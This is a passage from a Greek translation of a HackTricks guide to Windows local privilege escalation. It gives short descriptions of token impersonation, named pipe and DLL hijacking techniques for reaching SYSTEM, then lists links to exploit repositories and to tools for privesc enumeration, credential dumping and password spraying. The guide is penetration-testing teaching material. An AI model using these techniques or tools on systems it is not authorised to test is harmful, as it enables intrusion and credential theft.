[Περισσότερες πληροφορίες σχετικά με τα registry keys και τον τρόπο εγκατάστασης ενός πακέτου _.msi_ εδώ.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε να** [**βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Αν έχετε αυτά τα token privileges (πιθανότατα θα τα βρείτε σε μια ήδη High Integrity διεργασία), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διεργασία** (εκτός από protected processes) με το SeDebug privilege, να **αντιγράψετε το token** της διεργασίας και να δημιουργήσετε μια **arbitrary διεργασία με αυτό το token**.\
Χρησιμοποιώντας αυτή την τεχνική, συνήθως **επιλέγεται οποιαδήποτε διεργασία εκτελείται ως SYSTEM με όλα τα token privileges** (_ναι, μπορείτε να βρείτε διεργασίες SYSTEM χωρίς όλα τα token privileges_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για privilege escalation στο `getsystem`. Η τεχνική αποτελείται από τη **δημιουργία ενός pipe και, στη συνέχεια, τη δημιουργία/κατάχρηση ενός service για εγγραφή σε αυτό το pipe**. Έπειτα, ο **server** που δημιούργησε το pipe χρησιμοποιώντας το **`SeImpersonate`** privilege θα μπορεί να **υποδυθεί το token** του pipe client (του service), αποκτώντας SYSTEM privileges.\
Αν θέλετε να [**μάθετε περισσότερα για τα name pipes, πρέπει να διαβάσετε αυτό**](#named-pipe-client-impersonation).\
Αν θέλετε να διαβάσετε ένα παράδειγμα για το [**πώς να μεταβείτε από high integrity σε System χρησιμοποιώντας name pipes, πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Αν καταφέρετε να **κάνετε hijack ένα dll** που **φορτώνεται** από μια **διεργασία** η οποία εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε arbitrary κώδικα με αυτά τα permissions. Επομένως, το Dll Hijacking είναι επίσης χρήσιμο για αυτού του είδους το privilege escalation και, επιπλέον, είναι πολύ **ευκολότερο να επιτευχθεί από μια διεργασία high integrity**, καθώς αυτή θα έχει **write permissions** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε να** [**μάθετε περισσότερα για το Dll hijacking εδώ**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Περισσότερη βοήθεια

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Χρήσιμα εργαλεία

**Καλύτερο εργαλείο για την αναζήτηση Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Έλεγχος για misconfigurations και sensitive files (**[**ελέγξτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Εντοπίστηκαν.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Έλεγχος για ορισμένα πιθανά misconfigurations και συλλογή πληροφοριών (**[**ελέγξτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Έλεγχος για misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει αποθηκευμένες πληροφορίες sessions από PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε το -Thorough locally.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει credentials από το Credential Manager. Εντοπίστηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Κάνει spray των credentials που συλλέχθηκαν σε ολόκληρο το domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα PowerShell ADIDNS/LLMNR/mDNS spoofer και man-in-the-middle tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Αναζήτηση γνωστών privesc vulnerabilities (DEPRECATED για το Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Απαιτούνται δικαιώματα Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζήτηση γνωστών privesc vulnerabilities (χρειάζεται compilation με χρήση VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Κάνει enumeration στο host αναζητώντας misconfigurations (περισσότερο gather info tool παρά privesc) (χρειάζεται compilation) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει credentials από πολλά software (precompiled exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Έλεγχος για misconfiguration (executable precompiled στο github). Δεν συνιστάται. Δεν λειτουργεί σωστά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Έλεγχος για πιθανά misconfigurations (exe από python). Δεν συνιστάται. Δεν λειτουργεί σωστά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool που δημιουργήθηκε με βάση αυτό το post (δεν χρειάζεται accesschk για να λειτουργήσει σωστά, αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει το output του **systeminfo** και προτείνει exploits που λειτουργούν (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει το output του **systeminfo** και προτείνει exploits που λειτουργούν (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να κάνετε compile το project χρησιμοποιώντας τη σωστή έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στο victim host, μπορείτε να εκτελέσετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Θεμελιώδεις αρχές Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Αύξηση προνομίων μέσω εκμετάλλευσης αδύναμων δικαιωμάτων φακέλων](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Workshop για Windows / Linux Local Privilege Escalation](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: το AT είναι το νέο black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Πλήρης οδηγός OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Οδηγός Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Λίστα ελέγχου Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Μέθοδοι Windows Privilege Escalation για Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing μέσω SMTP → αποκρυπτογράφηση credentials του hMailServer → Veeam CVE-2023-27532 έως SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) και κλοπή kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Καταδιώκοντας την Silver Fox: Cat & Mouse στις σκιές του Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ευπάθεια προνομιακού File System σε σύστημα SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Εργαλεία δοκιμών Symbolic Link – χρήση του CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Ένας Link στο παρελθόν. Κατάχρηση Symbolic Links στα Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Επικίνδυνη επίλυση Module στα Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: φόρτωση από φακέλους `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Προκλήσεις checklist C/C++, λυμένες](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Συνάρτηση RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own με Microslop: Αλυσιδωτές CLDFLT και DirectX Kernel Race Conditions για Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Ένα I/O Ring για να τα κυβερνήσει όλα: Ένα πλήρες Read/Write Exploit Primitive στα Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Κατάχρηση αυθαίρετων διαγραφών αρχείων για Privilege Escalation και άλλα εξαιρετικά tricks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - κώδικας exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Μέρος 2: CVE-2020-1013, ένα Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Εξερευνώντας το Credential Manager και το Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Όταν μια αλλαγή image οδηγεί σε Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Εξαγωγή ιδιωτικών SSH κλειδιών από το Windows 10 SSH Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Μετατρέποντας τους Enterprise Update Servers σε εργοστάσια Backdoor (0_o) – Μέρος 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Μετατρέποντας τους Enterprise Update Servers σε εργοστάσια Backdoor (0_o) – Μέρος 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
